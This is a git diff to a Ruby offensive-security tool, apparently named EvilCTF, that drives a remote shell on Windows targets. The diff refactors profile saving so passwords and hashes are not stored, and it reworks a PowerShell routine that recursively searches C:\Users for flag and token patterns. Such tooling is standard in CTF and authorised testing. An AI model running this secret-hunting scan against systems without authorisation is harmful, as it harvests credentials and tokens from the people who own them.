@@ -1,8 +1,6 @@
 #!/usr/bin/env ruby
 # frozen_string_literal: true
 
-# Compatibility shim – define Fixnum for very old Rubies (pre-2.4)
-class Integer < Integer; end if (RUBY_VERSION.to_f < 2.4) && !defined?(Integer)
 require 'fileutils'
 require 'zip'
 require 'uri'
@@ -13,6 +11,7 @@ require 'digest/sha1'
 require 'readline'
 require 'shellwords'
 require 'evil_ctf/uploader'
+require_relative '../config/profiles'
 require_relative 'tools/downloader'
 require_relative 'tools/stager'
 require_relative 'tools/macro_engine'
@@ -544,8 +543,8 @@ module EvilCTF
       )
     end
 
-    def self.execute_staged_tool(key, args = '', shell)
-      Stager.execute_staged_tool(key, args, shell, registry: TOOL_REGISTRY)
+    def self.execute_staged_tool(key, args = '', shell, remote_path: nil)
+      Stager.execute_staged_tool(key, args, shell, registry: TOOL_REGISTRY, remote_path: remote_path)
     end
 
     def self.locate_extracted_remote_path(shell, recommended_remote, extracted_file)
@@ -587,12 +586,36 @@ module EvilCTF
       {}
     end
 
-    def self.save_config_profile(name, options)
-      profile_file = File.join('config', "#{name}.yaml")
-      FileUtils.mkdir_p(File.dirname(profile_file))
+    # Keys that are safe to persist in a connection profile. Secrets
+    # (:password / :hash) and runtime objects are deliberately excluded.
+    PROFILE_SAFE_KEYS = %i[
+      ip user username port ssl transport kerberos realm keytab
+      proxy webhook banner_mode debug stealth random_names auto_evasion
+      beacon fresh auto_exec ipv6 ipv6_hostname user_agent
+    ].freeze
 
-      File.write(profile_file, YAML.dump(options))
-      puts "[+] Profile saved to #{profile_file}"
+    def self.save_config_profile(name, options)
+      name = name.to_s.strip
+      return puts '[*] Usage: profile save <name>' if name.empty?
+
+      sanitized = {}
+      PROFILE_SAFE_KEYS.each do |key|
+        value = options[key]
+        sanitized[key] = value if options.key?(key) && !value.nil?
+      end
+
+      # Normalize the username alias and never persist secrets.
+      sanitized[:user] ||= sanitized.delete(:username)
+      sanitized.delete(:user) if sanitized[:user].nil?
+      sanitized.delete(:password)
+      sanitized.delete(:hash)
+
+      saved = EvilCTF::Config::Profiles.save_profile(name: name, data: sanitized)
+      if saved
+        puts "[+] Profile saved to #{saved}"
+      else
+        puts '[!] Failed to save profile'
+      end
     rescue StandardError => e
       puts "[!] Failed to save profile: #{e.message}"
     end
@@ -616,16 +639,25 @@ module EvilCTF
         /token\s*[:=]\s*["']?([^"'\s]+)["']?/i
       ]
 
-      # Use Get-ChildItem with -Recurse and -Filter
+      # Build a real PowerShell string array (not a JSON blob) so
+      # Select-String matches against each pattern independently.
+      patterns_json = patterns.map(&:source).to_json
+      # Restrict the recursive scan: shallow depth, skip noisy/irrelevant dirs,
+      # ignore huge files, and cap how many files we read. Flags are small text
+      # files, so these bounds preserve coverage without scanning the entire
+      # user profile (AppData can hold hundreds of thousands of files).
       ps = <<~PS
-        $patterns = #{patterns.map(&:source).to_json}
-        $files = Get-ChildItem -Path "C:\\Users" -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
-          $_.Length -gt 0 -and $_.Name -notmatch "^."#{' '}
-        }
+        $patterns = '#{patterns_json}' | ConvertFrom-Json
+        $files = Get-ChildItem -Path "C:\\Users" -Recurse -File -Depth 3 -ErrorAction SilentlyContinue |
+          Where-Object {
+            $_.Length -gt 0 -and $_.Length -lt 2MB -and
+            $_.FullName -notmatch '(AppData|Application Data|NTUSER\\.DAT|ntuser\\.dat|Local Settings|Cookies|Roaming|Cache)'
+          } |
+          Select-Object -First 250
         $found = @()
         foreach ($file in $files) {
           try {
-            $content = Get-Content $file.FullName -Raw
+            $content = Get-Content $file.FullName -Raw -ErrorAction Stop
             $matches = $content | Select-String -Pattern $patterns -AllMatches
             if ($matches) {
               $flag = $matches.Matches | ForEach-Object { $_.Value }
@@ -635,13 +667,18 @@ module EvilCTF
               }
             }
           } catch {}
+          if ($found.Count -ge 50) { break }
         }
         $found | ConvertTo-Json -Depth 5
       PS
 
       begin
         result = shell.run(ps)
-        data = JSON.parse(result.output)
+        raw = result.output.to_s.strip
+        return if raw.empty?
+
+        data = JSON.parse(raw)
+        data = [data] unless data.is_a?(Array)
         data.each do |f|
           puts "\n[+] Found flag: #{f['Path']}"
           puts f['Content']
